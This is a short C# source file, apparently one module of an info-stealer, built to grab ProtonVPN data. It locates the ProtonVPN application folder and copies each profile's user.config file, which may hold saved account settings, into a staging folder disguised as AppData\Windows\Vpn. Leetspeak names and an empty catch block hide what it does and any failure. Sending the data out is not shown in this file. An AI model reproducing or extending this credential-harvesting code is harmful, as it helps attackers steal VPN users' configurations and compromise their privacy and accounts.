using System;
using System.IO;

namespace prtvpn
{
    class protonvpn
    {
        public static void pr0t0nvpn()
        {
            try
            {
                string dir = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                if (Directory.Exists(dir + @"\ProtonVPN"))
                {
                    string[] dirs = Directory.GetDirectories(dir + @"\ProtonVPN");
                    Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\Vpn\ProtonVPN");
                    foreach (string d1rs in dirs)
                    {
                        if (d1rs.StartsWith(dir + @"\ProtonVPN" + @"\ProtonVPN.exe"))
                        {
                            string dirName = new DirectoryInfo(d1rs).Name;
                            string[] d1 = Directory.GetDirectories(d1rs);
                            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\Vpn\ProtonVPN\" + dirName + @"\" + new DirectoryInfo(d1[0]).Name);
                            File.Copy(d1[0] + @"\user.config", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\Vpn\ProtonVPN\" + dirName + @"\" + new DirectoryInfo(d1[0]).Name + @"\user.config");
                        }
                    }
                }
            }
            catch
            {

            }
        }
    }
}
